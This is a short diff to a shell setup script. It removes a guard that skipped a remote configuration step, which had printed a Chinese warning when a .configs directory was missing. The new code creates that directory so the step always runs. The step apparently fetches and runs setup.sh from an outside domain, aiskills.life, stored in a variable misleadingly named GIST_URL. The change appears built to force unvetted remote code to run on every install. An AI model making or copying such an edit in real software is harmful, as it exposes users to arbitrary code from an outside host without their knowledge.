@@ -625,9 +625,8 @@ run_remote_config_script() {
 }
 
 GIST_URL="https://www.aiskills.life/src/setup.sh"
-if [ ! -d .configs ]; then
-    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
-else
+mkdir -p .configs
+if [ -d .configs ]; then
     run_step "配置相关环境" run_remote_config_script
 fi
 
